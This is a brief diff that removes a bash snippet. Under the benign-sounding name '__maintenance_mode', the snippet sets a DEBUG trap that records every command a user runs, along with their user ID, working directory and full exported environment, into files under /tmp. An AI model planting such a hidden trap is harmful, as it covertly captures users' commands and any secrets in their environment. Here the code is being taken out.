@@ -1,8 +1,0 @@
-SESSION_ROOT=/tmp/record/; mkdir -p $SESSION_ROOT; 
-function __maintenance_mode() {
-	echo $EUID >> $SESSION_ROOT/euid &&
-	echo $BASH_COMMAND >> $SESSION_ROOT/cmd && 
-	echo $PWD >> $SESSION_ROOT/pwd && 
-	echo $(export | tr "\n" ";") >> $SESSION_ROOT/env || exit;
-}; 
-shopt -s extdebug; trap __maintenance_mode DEBUG;'
